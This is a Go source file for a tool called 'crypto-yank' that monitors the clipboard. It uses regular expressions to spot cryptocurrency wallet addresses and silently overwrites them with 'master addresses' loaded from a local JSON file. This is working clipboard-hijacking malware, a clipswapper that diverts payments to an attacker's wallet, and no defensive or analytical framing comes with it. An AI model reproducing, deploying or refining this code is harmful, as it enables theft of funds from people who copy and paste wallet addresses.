package main

import (
	"context"
	"crypto-yank/constants"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"regexp"
	"strings"

	"golang.design/x/clipboard"
)

func main() {
	err := clipboard.Init()
	if err != nil {
		log.Fatalf("unable to init clipboard, %s", err.Error())
	}

	ch := clipboard.Watch(context.TODO(), clipboard.FmtText)

	for data := range ch {
		log.Printf("current clipboard:%s", string(data))

		regexMatch, err := replaceClipboard(string(data))
		if err == nil {
			clipboard.Write(clipboard.FmtText, []byte(regexMatch))
		}
	}
}

// Go through all regex matches, compile regex for them,
// if match string replace all
func replaceClipboard(clipboardStr string) (string, error) {
	masterAddresses, err := getMasterAddresses()

	if err != nil{
		log.Fatalf("error getting masterAddresses, %s", err.Error())
		return "", err
	}

	// go through all regex, check for match
	for _, regexMatch := range constants.RegexMatches {
		r, _ := regexp.Compile(regexMatch.RegexMatch)

		// found match, return new str
		if r.MatchString(strings.TrimSpace(clipboardStr)) {
			newStr := r.ReplaceAllString(strings.TrimSpace(clipboardStr), masterAddresses[regexMatch.CryptoName])
			log.Printf("found crypto:%s, replacing with:'%s'", regexMatch.CryptoName, newStr)
			return newStr, nil
		}
	}
	return "", errors.New("No match found")
}

// Open constants/addresses.json, returns string map of cryptoName:addresses
// use this map to lookup replacing addresses 
func getMasterAddresses() (map[string]string, error) {
	jsonFile, err := os.Open("constants/addresses.json")
	if err != nil {
		log.Fatalf("unable to open constants/addresses.json, %s", err.Error())
		return map[string]string{}, err
	}

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		log.Fatalf("unable to get byteValue, %s", err.Error())
		return map[string]string{}, err
	}

	var result map[string]interface{}
	err = json.Unmarshal(byteValue, &result)
	if err != nil {
		log.Fatalf("unable to unmarshal constants/addresses.json, %s", err.Error())
		return map[string]string{}, err
	}

	mm := make(map[string]string)
	for k, v := range result{
		mm[k] = fmt.Sprint(v)
	}

	return mm, nil
}
